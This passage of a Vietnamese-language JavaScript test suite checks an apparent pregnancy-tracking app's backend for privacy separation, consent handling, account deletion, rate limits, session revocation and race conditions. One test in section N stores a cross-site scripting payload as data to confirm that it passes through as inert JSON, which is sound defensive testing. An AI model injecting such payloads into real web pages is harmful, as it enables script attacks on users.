  T('không tab nào ngoài NguoiDung (kể cả file Chữ riêng) chứa SĐT dưới mọi dạng', leaks.length === 0, leaks);
  const users = rows(env, 'NguoiDung');
  T('NguoiDung không có ngày dự sinh, mức đếm, cảm xúc', !users.some(r => r.some(v => ['2027-01-21', 'Con cử động đều', 'Lo lắng'].includes(v))));
  T('HoSo chỉ có mã người dùng + ngày dự sinh + ngày chào đời + giờ', rows(env, 'HoSo').every(r => /^u[0-9a-f]{23}$/.test(r[0]) && r.length === 5));
  T('chữ tự viết KHÔNG nằm ở file Dữ liệu', !env.allCells().some(c => c.file === 'MBAY – Dữ liệu' && (c.v === 'ghi chú' || c.v === 'Mẹ thương con')));
  T('chữ tự viết nằm ở file Chữ riêng, chỉ mang mã người dùng', rows(env, 'ChuRieng', 'priv').length === 4 && rows(env, 'ChuRieng', 'priv').every(r => /^u[0-9a-f]{23}$/.test(r[1])));
}

/* =====================================================================
 * M. S-10 Không admin trong client, không SĐT đặc biệt
 * ===================================================================== */
section('M. S-10 không admin, không SĐT viết cứng');
{
  const code = SRC.replace(/\/\*[\s\S]*?\*\//g, '').replace(/(^|[^:'"])\/\/[^\n]*/g, '$1');
  T('script không có SĐT di động viết cứng (0xxxxxxxxx / +84… / 84…)', !/(^|\D)(0|\+?84)[35789]\d{8}(\D|$)/.test(SRC));
  T('không action quản trị, không nhánh theo SĐT đặc biệt', !/admin|isAdmin|ADMIN_PHONE|superuser/i.test(code));
  T('doGet không gọi Sheet / không đọc tham số', /function doGet\(\) \{\s*return json_\(\{ result: 'error', error: 'public_read_disabled' \}\);\s*\}/.test(SRC));
  const api = fs.readFileSync(path.join(APP, 'js', 'api.js'), 'utf8');
  T('js/api.js không có SĐT viết cứng, không action quản trị', !/(^|\D)(0|\+?84)[35789]\d{8}(\D|$)/.test(api) && !/admin/i.test(api));
}

/* =====================================================================
 * N. S-11 Chuỗi trả về là dữ liệu JSON (client tự escape)
 * ===================================================================== */
section('N. S-11 chuỗi lạ đi qua nguyên vẹn dưới dạng dữ liệu JSON');
{
  const env = fresh();
  const a = reg(env, newPhone(), { consent: consent(true) });
  const xss = '<img src=x onerror=alert(1)><script>alert(2)</script>';
  const l = letter({ text: xss }), c = checkin({ note: xss });
  save(env, a.token, [l, c]);
  const r = list(env, a.token, { kinds: ['letter', 'checkin'] });
  T('lưu rồi đọc lại đúng nguyên văn (không HTML hóa ở server, không chèn)', r.records.letter[0].text === xss && r.records.checkin[0].note === xss);
  T('phản hồi Content-Type JSON', env.lastMime === 'application/json');
  T('mã nhãn lạ trên Sheet (ai đó sửa tay) bị bỏ khi đọc lại', (() => { const sh = env.sheet('CheckIn'); sh.getRange(2, 5).setValue('<b>Lo lắng</b>'); sh.getRange(2, 8).setValue('<script>'); const x = list(env, a.token, { kinds: ['checkin'] }).records.checkin[0]; return x.emotions.length === 0 && x.exercise === null; })());
}

/* =====================================================================
 * O. Các action còn lại: whoami, listMine, exportMine, deleteRecords, setConsent, deleteAccount
 * ===================================================================== */
section('O. whoami, listMine, exportMine, deleteRecords, setConsent, deleteAccount');
{
  const env = fresh();
  const p = newPhone();
  const a = reg(env, p);
  const pr = save(env, a.token, [{ kind: 'prefs', enabled: ['side_sleep', 'kick', 'water'] }, profile({ edd: '2027-03-01' })]);
  const w = env.post({ action: 'whoami', token: a.token });
  T('whoami: phoneMasked, exp, acct, consent, habits (thứ tự chuẩn), edd', pr.saved.length === 2 && w.result === 'success' && w.phoneMasked === '+849 ••• ••' + p.slice(-3) && w.exp === a.exp && w.acct === a.acct &&
    JSON.stringify(w.habits) === '["kick","water","side_sleep"]' && w.edd === '2027-03-01' && w.consent.text === false, w);
  T('prefs rỗng → habits []', save(env, a.token, [{ kind: 'prefs', enabled: [] }]).saved.length === 1 && JSON.stringify(env.post({ action: 'whoami', token: a.token }).habits) === '[]');
  T('prefs trùng / lạ / không phải mảng → từ chối', save(env, a.token, [{ kind: 'prefs', enabled: ['kick', 'kick'] }, { kind: 'prefs', enabled: ['yoga'] }, { kind: 'prefs' }, { kind: 'prefs', enabled: 'kick' }]).rejected.length === 4);
  const lg = env.post({ action: 'login', phone: p, pin: PIN });
  T('login trả habits + edd đã lưu (Session)', JSON.stringify(lg.habits) === '[]' && lg.edd === '2027-03-01');
  // Chữ tự viết theo đồng ý
  const l1 = letter(), c1 = checkin({ note: 'kể thêm hôm nay' });
  const r1 = save(env, a.token, [l1, c1]);
  T('đồng ý chữ TẮT: lời nhắn → text_consent_required', r1.rejected.length === 1 && r1.rejected[0].key === 'letter:' + l1.id && r1.rejected[0].error === 'text_consent_required');
  T('đồng ý chữ TẮT: check-in vẫn lưu, bỏ "kể thêm", warn note_dropped', r1.saved.includes('checkin:' + c1.id) && JSON.stringify(r1.warn) === JSON.stringify([{ key: 'checkin:' + c1.id, warn: 'note_dropped' }]) && rows(env, 'ChuRieng', 'priv').length === 0);
  T('setConsent sai kiểu → bad_json', env.post({ action: 'setConsent', token: a.token, text: 'true' }).error === 'bad_json' && env.post({ action: 'setConsent', token: a.token, text: true, deleteText: 1 }).error === 'bad_json');
  const on = env.post({ action: 'setConsent', token: a.token, text: true });
  T('setConsent text:true → consent.text true, cột F "Có · ngày"', on.result === 'success' && on.consent.text === true && rows(env, 'NguoiDung')[0][5] === 'Có · 29/10/2026');
  const r2 = save(env, a.token, [l1, c1]);
  T('đồng ý BẬT: lời nhắn và "kể thêm" lưu ở file Chữ riêng', r2.saved.length === 2 && !r2.warn && rows(env, 'ChuRieng', 'priv').length === 2);
  const lm = list(env, a.token, { kinds: ['letter', 'checkin'] }).records;
  T('listMine trả letter và checkin.note khi đồng ý bật', lm.letter.length === 1 && lm.letter[0].text === 'Mẹ thương con' && lm.checkin[0].note === 'kể thêm hôm nay');
  save(env, a.token, [Object.assign({}, c1, { note: '' })]);
  T('check-in gửi lại không còn "kể thêm" → xóa dòng chữ cũ', rows(env, 'ChuRieng', 'priv').length === 1);
  save(env, a.token, [c1]);
  const off = env.post({ action: 'setConsent', token: a.token, text: false });
  const lm2 = list(env, a.token, { kinds: ['letter', 'checkin'] }).records;
  T('tắt (Giữ những gì đã gửi): chữ còn trên Sheet nhưng listMine không trả', off.consent.text === false && rows(env, 'ChuRieng', 'priv').length === 2 && lm2.letter.length === 0 && lm2.checkin[0].note === undefined);
  const ex = env.post({ action: 'exportMine', token: a.token });
  T('exportMine vẫn xuất chữ đã lưu (dữ liệu của chính chị)', ex.records.letter.length === 1 && ex.records.checkin[0].note === 'kể thêm hôm nay');
  T('exportMine: account phoneMasked, createdAt, consent, edd', ex.account.phoneMasked === w.phoneMasked && ex.account.createdAt === '10:00:00 29/10/2026' && ex.account.consent.text === false && ex.account.edd === '2027-03-01');
  T('exportMine có đủ 7 loại', ['habit', 'prefs', 'profile', 'checkin', 'thaigiao', 'kick', 'letter'].every(k => k in ex.records));
  const b = reg(env, newPhone(), { consent: consent(true) });
  save(env, b.token, [letter(), checkin({ note: 'của B' })]);
  env.post({ action: 'setConsent', token: a.token, text: false, deleteText: true });
  T('setConsent {text:false, deleteText:true} xóa sạch chữ của A, chữ của B còn', rows(env, 'ChuRieng', 'priv').length === 2 && rows(env, 'ChuRieng', 'priv').every(r => r[1] === rows(env, 'NguoiDung')[1][0]));
  // listMine lọc
  const env2 = fresh();
  const s = reg(env2, newPhone(), { consent: consent(true) });
  const k1 = kick(), t1 = tg({ day: '2026-10-27' });
  save(env2, s.token, [habit({ day: '2026-10-27' }), habit(), k1, t1, checkin(), letter(), profile()]);
  const all = list(env2, s.token);
  T('listMine mặc định: đủ 7 loại + serverDay + truncated', JSON.stringify(Object.keys(all.records).sort()) === JSON.stringify(['checkin', 'habit', 'kick', 'letter', 'prefs', 'profile', 'thaigiao']) && all.serverDay === DAY && all.truncated === false);
  T('listMine kinds:["kick"] chỉ trả kick', JSON.stringify(Object.keys(list(env2, s.token, { kinds: ['kick'] }).records)) === '["kick"]');
  T('listMine sinceDay lọc theo ngày', list(env2, s.token, { sinceDay: DAY }).records.habit.length === 1 && list(env2, s.token, { sinceDay: DAY }).records.thaigiao.length === 0 && all.records.habit.length === 2);
  T('listMine sinceDay / kinds sai → bad_records', list(env2, s.token, { sinceDay: '2026-13-01' }).error === 'bad_records' && list(env2, s.token, { kinds: 'kick' }).error === 'bad_records');
  const kb = all.records.kick[0];
  T('listMine kick: startAt = giờ server − startAgeMs, đủ trường, gaDays', kb.startAt === env2.clock.now() - k1.startAgeMs && kb.meal === 'dinner' && kb.level === 'green' && kb.h1 === 5 && kb.min4 === 20 && kb.min10 === null && kb.gaDays === 200 && kb.taps.length === 5 && kb.hadYellow === false);
  T('DemConDap: Tuần thai server tự dựng "28 tuần 4 ngày"', rows(env2, 'DemConDap')[0][16] === '28 tuần 4 ngày' && rows(env2, 'DemConDap')[0][15] === 200);
  T('listMine thaigiao / checkin / habit đúng shape', all.records.thaigiao[0].prompt === 'TG-05' && all.records.thaigiao[0].how === 'done' && all.records.checkin[0].emotions.join() === 'worried,tired' && all.records.habit[1].marks.kick === 'a');
  // deleteRecords
  const ci = all.records.checkin[0].id, lt = all.records.letter[0].id;
  save(env2, s.token, [checkin({ id: ci, note: 'chữ' })]);
  const del = env2.post({ action: 'deleteRecords', token: s.token, items: [{ kind: 'kick', id: k1.id }, { kind: 'thaigiao', id: t1.id }, { kind: 'checkin', id: ci }, { kind: 'letter', id: lt }, { kind: 'habit', day: '2026-10-27' }, { kind: 'kick', id: 'khongcomaluotnay' }] });
  T('deleteRecords: xóa 5 mục có thật, mã không có không lỗi', del.result === 'success' && del.deleted === 5, del);
  T('xóa lượt đếm xóa cả DemConDap và DauChan; xóa check-in xóa cả "kể thêm"', rows(env2, 'DemConDap').length === 0 && rows(env2, 'DauChan').length === 0 && rows(env2, 'CheckIn').length === 0 && rows(env2, 'ChuRieng', 'priv').length === 0 && rows(env2, 'ThoiQuen').length === 1);
  T('deleteRecords > 50 → too_many_records; mục sai → bad_records', env2.post({ action: 'deleteRecords', token: s.token, items: Array(51).fill({ kind: 'habit', day: DAY }) }).error === 'too_many_records' &&
    env2.post({ action: 'deleteRecords', token: s.token, items: [{ kind: 'habit', day: 'x' }] }).error === 'bad_records' && env2.post({ action: 'deleteRecords', token: s.token, items: [{ kind: 'profile' }] }).error === 'bad_records' && env2.post({ action: 'deleteRecords', token: s.token }).error === 'bad_records');
  // deleteAccount
  const env3 = fresh();
  const pa = newPhone(), pb = newPhone();
  const A = reg(env3, pa, { consent: consent(true) }), B = reg(env3, pb, { consent: consent(true) });
  const full = () => [habit(), kick(), checkin({ note: 'n' }), letter(), tg(), profile(), { kind: 'prefs', enabled: ['kick'] }];
  save(env3, A.token, full()); save(env3, B.token, full());
  env3.post({ action: 'login', phone: pa, pin: WRONG });
  const A2 = env3.post({ action: 'login', phone: pa, pin: PIN, privateDevice: true });
  env3.post({ action: 'login', phone: pa, pin: WRONG });
  env3.post({ action: 'whoami', token: A2.token });
  T('deleteAccount thiếu / sai xác nhận → confirm_required', env3.post({ action: 'deleteAccount', token: A.token }).error === 'confirm_required' && env3.post({ action: 'deleteAccount', token: A.token, confirm: 'delete' }).error === 'confirm_required');
  const uidA = rows(env3, 'NguoiDung')[0][0], uidB = rows(env3, 'NguoiDung')[1][0];
  T('deleteAccount thành công', env3.post({ action: 'deleteAccount', token: A.token, confirm: 'DELETE' }).result === 'success');
  const leftA = env3.allCells().filter(c => String(c.v).includes(uidA));
  T('mọi dòng của A ở CẢ HAI file đã xóa (10 tab)', leftA.length === 0, leftA);
  T('DangNhapSai của số A đã xóa', rows(env3, 'DangNhapSai').length === 0);
  T('dữ liệu B còn nguyên', ['ThoiQuen', 'CheckIn', 'ThaiGiao', 'DemConDap', 'DauChan', 'HoSo'].every(t => rows(env3, t).length === 1 && rows(env3, t)[0].includes(uidB)) && rows(env3, 'ChuRieng', 'priv').length === 2);
  T('mọi phiên của A hết (kể cả phiên khác đang trong đệm)', env3.post({ action: 'whoami', token: A.token }).error === 'session_expired' && env3.post({ action: 'whoami', token: A2.token }).error === 'session_expired');
  T('sau khi xóa: số A như chưa đăng ký, đăng ký lại được', env3.post({ action: 'login', phone: pa, pin: PIN }).remaining === 4 && env3.post({ action: 'register', phone: pa, pin: PIN2, consent: consent() }).result === 'success');
}

/* =====================================================================
 * P. Giới hạn đăng ký, dọn hằng ngày, đo số vòng, tự kiểm tra
 * ===================================================================== */
section('P. giới hạn đăng ký, cleanupDaily_, benchPinHash_, test_');
{
  T('hằng REGISTER_MAX_PER_HOUR = 30 trong mã', /var REGISTER_MAX_PER_HOUR = 30;/.test(SRC));
  const env = fresh({ consts: { REGISTER_MAX_PER_HOUR: 3 } });
  const rs = [1, 2, 3, 4].map(() => env.post({ action: 'register', phone: newPhone(), pin: PIN, consent: consent() }));
  T('quá 3 đăng ký/giờ toàn hệ thống → rate_limited có retryAfterSec', rs.slice(0, 3).every(r => r.result === 'success') && rs[3].error === 'rate_limited' && rs[3].retryAfterSec > 0 && rows(env, 'NguoiDung').length === 3);
  env.advance(HOUR);
  T('giờ sau đăng ký lại được', env.post({ action: 'register', phone: newPhone(), pin: PIN, consent: consent() }).result === 'success');
  // cleanupDaily_
  const envC = fresh();
  const p1 = newPhone(), p2 = newPhone(), p3 = newPhone();
  const s1 = reg(envC, p1);
  const s2 = envC.post({ action: 'login', phone: p1, pin: PIN, privateDevice: true });
  const s3 = envC.post({ action: 'login', phone: p1, pin: PIN });
  envC.post({ action: 'logout', token: s3.token });
  reg(envC, p2); envC.resetPin(p2);
  envC.post({ action: 'login', phone: p3, pin: WRONG });
  envC.advance(25 * HOUR);
  const out = envC.ctx.cleanupDaily_();
  T('cleanupDaily_: xóa phiên hết hạn + đã thu hồi, giữ phiên còn hạn', out.sessions >= 2 && envC.post({ action: 'whoami', token: s2.token }).result === 'success' && envC.post({ action: 'whoami', token: s1.token }).error === 'session_expired', out);
  T('cleanupDaily_: xóa dòng đếm sai cũ > 24 giờ', out.fails >= 1 && rows(envC, 'DangNhapSai').length === 0, out);
  T('cleanupDaily_: mã đặt lại quá hạn → ghi rõ cần đặt lại lần nữa', out.resets === 1 && /hết hạn/.test(rows(envC, 'NguoiDung')[1][7]) && rows(envC, 'NguoiDung')[1][11] === '');
  T('cleanupDaily_ mặc định không xóa tài khoản', out.inactive === 0 && rows(envC, 'NguoiDung').length === 2);
  const envI = fresh({ consts: { INACTIVE_DELETE_MONTHS: 1 } });
  const pi = newPhone(); const si = reg(envI, pi); save(envI, si.token, [habit()]);
  const pj = newPhone(); reg(envI, pj);
  envI.advance(20 * DAYMS); envI.post({ action: 'login', phone: pj, pin: PIN });
  envI.advance(15 * DAYMS);
  const oi = envI.ctx.cleanupDaily_();
  T('INACTIVE_DELETE_MONTHS=1: xóa tài khoản không dùng > 1 tháng (cả dữ liệu), giữ người vừa dùng', oi.inactive === 1 && rows(envI, 'NguoiDung').length === 1 && rows(envI, 'ThoiQuen').length === 0);
  // benchPinHash_, test_
  const envB = fresh();
  const bench = envB.ctx.benchPinHash_();
  T('benchPinHash_: đo 1.000 / 2.000 / 5.000 vòng, ghi Nhật ký', bench.length === 3 && bench.map(x => x.iter).join() === '1000,2000,5000' && envB.logs.filter(l => /^benchPinHash_: \d+ vòng = \d+ ms$/.test(l)).length === 3);
  const envT = fresh();
  const ok = envT.ctx.test_();
  T('test_ (selfTest) chạy hết, log "test_: XONG"', ok === true && envT.logs.includes('test_: XONG'), envT.logs);
  T('test_ tự xóa tài khoản thử, không để lại dòng nào', ['NguoiDung', 'PhienDangNhap', 'DangNhapSai', 'ThoiQuen', 'DemConDap', 'DauChan', 'ThaiGiao'].every(t => rows(envT, t).length === 0));
  T('selfTest() gọi test_()', typeof envT.ctx.selfTest === 'function' && /function selfTest\(\) \{ return test_\(\); \}/.test(SRC));
}

/* =====================================================================
 * R. Review T-RB: tranh chấp ngoài lock, thu hồi phiên, giới hạn theo người, làm đầy Sheet, born, lưới Sheet
 * ===================================================================== */
section('R1. Tranh chấp: lần chạy khác xóa dòng giữa lúc TÌM và lúc ĐỌC → không bao giờ trả dữ liệu người khác');
{
  /* Chen fn() ngay sau một lần TextFinder.findAll ngoài lock trên tab `tab` (tối đa `times` lần) */
  const inject = (env, tab, fn, times) => {
    let n = 0;
    env.hooks.afterFind = info => { if (info.sheet === tab && info.count && !info.inLock && n < (times || 1)) { n++; fn(); } };
    return () => n;
  };
  const three = (texton) => {
    const env = fresh();
    const mk = () => reg(env, newPhone(), { consent: consent(texton !== false) });
    const B = mk(), A = mk(), C = mk();
    const data = who => [habit({ marks: { water: 'x', kick: who === 'A' ? 'a' : '' } }), kick(), checkin({ note: 'kể của ' + who }), letter({ text: 'Thư riêng của ' + who }), tg(), profile({ edd: who === 'C' ? '2027-02-02' : '2027-01-21' })];
    save(env, B.token, data('B')); save(env, A.token, data('A')); save(env, C.token, data('C'));
    const uids = rows(env, 'NguoiDung').map(r => r[0]);
    return { env, A, B, C, uidB: uids[0], uidA: uids[1], uidC: uids[2] };
  };
  const clean = (o, x) => !JSON.stringify(o).includes(x.uidC) && !JSON.stringify(o).includes(x.uidB) && !/của C|của B/.test(JSON.stringify(o)) && !JSON.stringify(o).includes('2027-02-02');
  // Probe 3 ca 1 + probe 4: B xóa tài khoản chen giữa lúc A tìm dòng phiên / dòng người dùng
  for (const tab of ['PhienDangNhap', 'NguoiDung']) {
    const x = three();
    Object.keys(x.env.cache).forEach(k => delete x.env.cache[k]);
    const fired = inject(x.env, tab, () => x.env.post({ action: 'deleteAccount', token: x.B.token, confirm: 'DELETE' }));
    const w = x.env.post({ action: 'whoami', token: x.A.token });
    const ex = x.env.post({ action: 'exportMine', token: x.A.token });
    x.env.hooks.afterFind = null;
    T('B xóa tài khoản chen giữa lúc A tìm ở ' + tab + ': whoami trả đúng A (hoặc thử lại), không SĐT người khác',
      (w.result === 'success' ? w.phoneMasked === x.A.phoneMasked : w.error === 'server_busy'), [fired(), w]);
    T('… exportMine kế tiếp chỉ có dữ liệu của A', ex.result === 'success' && clean(ex, x) && ex.records.letter.map(l => l.text).join() === 'Thư riêng của A' && ex.account.phoneMasked === x.A.phoneMasked, ex.records && ex.records.letter);
  }
  // Probe 3 ca 2: B xóa thư phía trên chen giữa listMine(letter) của A
  {
    const x = three();
    const lb = list(x.env, x.B.token, { kinds: ['letter'] }).records.letter[0].id;
    const fired = inject(x.env, 'ChuRieng', () => x.env.post({ action: 'deleteRecords', token: x.B.token, items: [{ kind: 'letter', id: lb }] }));
    const lm = list(x.env, x.A.token, { kinds: ['letter', 'checkin'] });
    x.env.hooks.afterFind = null;
    T('B xóa thư chen giữa listMine của A → chỉ thư của A, đủ (tìm lại khi dòng dịch)', fired() === 1 && lm.result === 'success' && lm.records.letter.map(l => l.text).join() === 'Thư riêng của A' && clean(lm, x), lm);
  }
  // Mọi tab A đọc ngoài lock × B xóa tài khoản chen giữa → kết quả hoặc ĐÚNG HỆT bản không tranh chấp, hoặc server_busy
  const TABS = ['NguoiDung', 'HoSo', 'ThoiQuen', 'CheckIn', 'ThaiGiao', 'DemConDap', 'DauChan', 'ChuRieng'];
  const bad = [];
  for (const tab of TABS) for (const act of ['listMine', 'exportMine', 'whoami']) {
    const x = three();
    const base = JSON.stringify(x.env.post({ action: act, token: x.A.token }));
    const fired = inject(x.env, tab, () => x.env.post({ action: 'deleteAccount', token: x.B.token, confirm: 'DELETE' }));
    const r = x.env.post({ action: act, token: x.A.token });
    x.env.hooks.afterFind = null;
    if (act !== 'whoami' && fired() !== 1) bad.push(tab + '/' + act + ' (không chen được)');
    if (!(r.error === 'server_busy' || JSON.stringify(r) === base) || !clean(r, x)) bad.push(tab + '/' + act);
  }
  T('8 tab × 3 action đọc: B xóa tài khoản chen giữa → A nhận đúng dữ liệu của mình (y hệt khi không tranh chấp) hoặc server_busy', !bad.length, bad);
  // deleteRecords của B / dọn hằng ngày chen giữa
  const bad2 = [];
  for (const tab of ['ThoiQuen', 'CheckIn', 'DemConDap', 'DauChan', 'ChuRieng', 'ThaiGiao']) {
    const x = three();
    const lb = list(x.env, x.B.token).records;
    const base = JSON.stringify(list(x.env, x.A.token));
    const fired = inject(x.env, tab, () => { x.env.post({ action: 'deleteRecords', token: x.B.token, items: [{ kind: 'kick', id: lb.kick[0].id }, { kind: 'checkin', id: lb.checkin[0].id }, { kind: 'letter', id: lb.letter[0].id }, { kind: 'thaigiao', id: lb.thaigiao[0].id }, { kind: 'habit', day: DAY }] }); x.env.ctx.cleanupDaily_(); });
    const r = list(x.env, x.A.token);
    x.env.hooks.afterFind = null;
    if (fired() !== 1) bad2.push(tab + ' (không chen được)');
    if (JSON.stringify(r) !== base || !clean(r, x)) bad2.push(tab);
  }
  T('B xóa bản ghi + dọn hằng ngày chen giữa listMine của A (6 tab) → kết quả y hệt, không dòng người khác', !bad2.length, bad2);
  // Dòng dịch liên tục 3 lần → không đoán: server_busy (client thử lại), vẫn không lộ
  {
    const x = three();
    for (let i = 0; i < 3; i++) { const o = reg(x.env, newPhone()); save(x.env, o.token, [habit()]); }
    const sh = x.env.sheet('ThoiQuen');
    // dời dòng của A xuống dưới vài dòng người khác để có dòng phía trên mà xóa
    x.env.post({ action: 'deleteRecords', token: x.A.token, items: [{ kind: 'habit', day: DAY }] });
    save(x.env, x.A.token, [habit({ marks: { kick: 'a' } })]);
    inject(x.env, 'ThoiQuen', () => {
      const vals = sh.values();
      const r = vals.findIndex((row, i) => i > 0 && row[0] !== x.uidA);
      if (r > 0) sh.deleteRows(r + 1, 1);       // lần chạy khác xóa một dòng phía trên dòng của A
    }, 3);
    const r = list(x.env, x.A.token, { kinds: ['habit'] });
    x.env.hooks.afterFind = null;
    T('dòng dịch ở cả 3 lần tìm → server_busy {retry:true}, không trả dữ liệu đoán', r.error === 'server_busy' && r.retry === true, r);
  }
  // Đọc dòng phiên luôn trong lock (đệm trống); dòng tìm thấy được kiểm lại đúng băm phiên
  {
    const env = fresh();
    const a = reg(env, newPhone());
    Object.keys(env.cache).forEach(k => delete env.cache[k]);
    const seen = [];
    env.hooks.afterFind = info => { if (info.sheet === 'PhienDangNhap') seen.push(info.inLock); };
    env.post({ action: 'whoami', token: a.token });
    env.hooks.afterFind = null;
    T('đệm trống: tìm và đọc dòng phiên TRONG lock (thu hồi không chen được giữa đọc và ghi đệm)', seen.length >= 1 && seen.every(Boolean), seen);
  }
}

section('R2. Thu hồi phiên không bị đệm che');
{
  const env = fresh();
  const p = newPhone();
  const a = reg(env, p), b = env.post({ action: 'login', phone: p, pin: PIN, privateDevice: true });
  env.post({ action: 'whoami', token: a.token }); env.post({ action: 'whoami', token: b.token });
  env.resetPin(p);
  const tk = 'tk:' + sha256(a.token).toString('hex');
  T('đặt lại PIN: đệm của phiên cũ thành "bia mộ" (không xóa trống để bị ghi lại)', env.cache[tk] && JSON.parse(env.cache[tk].v).revoked === 1);
  T('đặt lại PIN: mọi phiên cũ hết NGAY', env.post({ action: 'whoami', token: a.token }).error === 'session_expired' && env.post({ action: 'whoami', token: b.token }).error === 'session_expired');
  env.cache[tk].v = JSON.stringify({ uid: rows(env, 'NguoiDung')[0][0], exp: env.clock.now() + DAYMS });
  T('dù đệm bị ghi lại thành phiên sống, Sheet đã thu hồi → lần đọc sau đệm hết hạn vẫn session_expired', (env.advance(11 * 60000), env.post({ action: 'whoami', token: a.token }).error === 'session_expired'));
  const env2 = fresh(); const s2 = reg(env2, newPhone());
  env2.post({ action: 'whoami', token: s2.token });
  env2.post({ action: 'logout', token: s2.token });
  T('logout: đệm thành bia mộ, token hết ngay', JSON.parse(env2.cache['tk:' + sha256(s2.token).toString('hex')].v).revoked === 1 && env2.post({ action: 'whoami', token: s2.token }).error === 'session_expired');
}

section('R3. Giới hạn theo NGƯỜI: tần suất, số phiên, đăng nhập thành công, trần bản ghi');
{
  const env = fresh({ consts: { SESSION_CALLS_PER_10MIN: 5 } });
  const p = newPhone(); reg(env, p);
  let ok = 0;
  for (let i = 0; i < 6; i++) { const t = env.post({ action: 'login', phone: p, pin: PIN }); for (let j = 0; j < 5; j++) if (env.post({ action: 'whoami', token: t.token }).result === 'success') ok++; }
  T('đăng nhập lại 6 lần không vượt giới hạn 5 lời gọi/10 phút (đếm theo uid)', ok === 5, ok);
  const env2 = fresh();
  const p2 = newPhone(); const first = reg(env2, p2);
  const toks = [first];
  for (let i = 0; i < 14; i++) toks.push(env2.post({ action: 'login', phone: p2, pin: PIN }));
  T('hằng SESSION_MAX_PER_USER = 10, LOGIN_OK_MAX_PER_HOUR = 20 trong mã', /var SESSION_MAX_PER_USER = 10;/.test(SRC) && /var LOGIN_OK_MAX_PER_HOUR = 20;/.test(SRC));
  T('15 lần đăng nhập → PhienDangNhap tối đa 10 dòng của người này', rows(env2, 'PhienDangNhap').length === 10, rows(env2, 'PhienDangNhap').length);
  T('phiên cũ nhất bị thu hồi, 10 phiên mới nhất còn dùng được', env2.post({ action: 'whoami', token: toks[0].token }).error === 'session_expired' && toks.slice(5).every(t => env2.post({ action: 'whoami', token: t.token }).result === 'success'));
  const env3 = fresh({ consts: { LOGIN_OK_MAX_PER_HOUR: 3 } });
  const p3 = newPhone(); reg(env3, p3);
  const ls = [1, 2, 3, 4].map(() => env3.post({ action: 'login', phone: p3, pin: PIN }));
  T('quá 3 lần đăng nhập ĐÚNG/giờ của một số → rate_limited', ls.slice(0, 3).every(r => r.result === 'success') && ls[3].error === 'rate_limited' && ls[3].retryAfterSec > 0);
  T('trần đăng nhập đúng không ảnh hưởng số khác', env3.post({ action: 'register', phone: newPhone(), pin: PIN, consent: consent() }).result === 'success');
  env3.advance(HOUR);
  T('giờ sau đăng nhập lại được', env3.post({ action: 'login', phone: p3, pin: PIN }).result === 'success');
  // Trần bản ghi mỗi ngày (probe 1 ca B)
  T('trần mỗi ngày trong mã: lượt đếm 10, check-in 20, thai giáo 10, lời nhắn 10', /var DAILY_QUOTA = \{ kick: 10, checkin: 20, thaigiao: 10, letter: 10 \};/.test(SRC));
  const env4 = fresh();
  const s4 = reg(env4, newPhone(), { consent: consent(true), privateDevice: true });
  let savedK = 0, lastRej = null;
  for (let b = 0; b < 3; b++) { const r = save(env4, s4.token, Array.from({ length: 10 }, () => kick())); savedK += r.saved.length; if (r.rejected.length) lastRej = r.rejected[0]; }
  T('một người gửi 30 lượt đếm mới trong ngày → chỉ 10 dòng, phần thừa record_invalid {field:"quota"}', savedK === 10 && rows(env4, 'DemConDap').length === 10 && rows(env4, 'DauChan').length === 10 && lastRej.field === 'quota', [savedK, lastRej]);
  Object.keys(env4.cache).forEach(k => delete env4.cache[k]);
  T('trần ngày đếm trên Sheet: dọn sạch đệm vẫn bị chặn', save(env4, s4.token, [kick()]).rejected[0].field === 'quota');
  const one = list(env4, s4.token, { kinds: ['kick'] }).records.kick[0];
  T('sửa lượt đã có (cùng mã) vẫn được khi đã chạm trần', save(env4, s4.token, [kick({ id: one.id, h1: 6, total: 6 })]).saved.length === 1);
  save(env4, s4.token, Array.from({ length: 15 }, () => checkin({ note: 'kể' })));   // "kể thêm" không ăn vào trần lời nhắn
  const lets = save(env4, s4.token, Array.from({ length: 10 }, () => letter())), lets2 = save(env4, s4.token, [letter()]);
  T('lời nhắn: 10/ngày (không tính dòng "kể thêm"), cái thứ 11 → quota', lets.saved.length === 10 && lets2.rejected[0].field === 'quota', [lets.saved.length, lets2]);
  env4.advance(DAYMS);
  T('sang ngày mới gửi tiếp được', save(env4, s4.token, [kick(), letter()]).saved.length === 2);
  const env5 = fresh({ consts: { TOTAL_QUOTA: { kick: 3, checkin: 6000, thaigiao: 3000, letter: 3000 } } });
  const s5 = reg(env5, newPhone(), { privateDevice: true });
  save(env5, s5.token, [kick(), kick()]); env5.advance(DAYMS);
  const r5 = save(env5, s5.token, [kick(), kick()]);
  T('trần TỔNG mỗi người (đếm thật trên Sheet, không phụ thuộc đệm) → quota', r5.saved.length === 1 && r5.rejected[0].field === 'quota' && rows(env5, 'DemConDap').length === 3);
  T('trần của A không chặn B', save(env5, reg(env5, newPhone()).token, [kick()]).saved.length === 1);
}

section('R4. Không cần đăng nhập vẫn không làm đầy được Sheet; khóa leo thang');
{
  T('hằng: khóa cố định PIN_LOCK_MIN = 15, cửa sổ FAIL_RESET_HOURS = 6, FAIL_ROWS_MAX = 3000; không còn bậc leo thang',
    /var PIN_LOCK_MIN = 15;/.test(SRC) && /var FAIL_RESET_HOURS = 6;/.test(SRC) && /var FAIL_ROWS_MAX = 3000;/.test(SRC) && !/LOCK_STEPS|lockNow_|locksAt/.test(SRC));
  const env = fresh({ consts: { FAIL_ROWS_MAX: 10 } });
  const p = newPhone(); reg(env, p);
  env.post({ action: 'login', phone: p, pin: WRONG });
  const many = Array.from({ length: 50 }, () => env.post({ action: 'login', phone: newPhone(), pin: WRONG }));
  T('50 số lạ thử sai: DangNhapSai không vượt FAIL_ROWS_MAX (dùng lại dòng cũ nhất không đang khóa), vẫn trả bad_credentials', rows(env, 'DangNhapSai').length === 10 && many.every(r => r.error === 'bad_credentials' && r.remaining === 4), rows(env, 'DangNhapSai').length);
  for (let i = 0; i < 3; i++) env.post({ action: 'login', phone: p, pin: WRONG });
  T('một số: đúng một dòng DangNhapSai, cập nhật chứ không thêm', rows(env, 'DangNhapSai').filter(r => r[0] === rows(env, 'NguoiDung')[0][13]).length === 1);
  const envF = fresh({ consts: { FAIL_ROWS_MAX: 3 } });
  const fp = [newPhone(), newPhone(), newPhone()];
  fp.forEach(ph => { for (let i = 0; i < 5; i++) envF.post({ action: 'login', phone: ph, pin: WRONG }); });
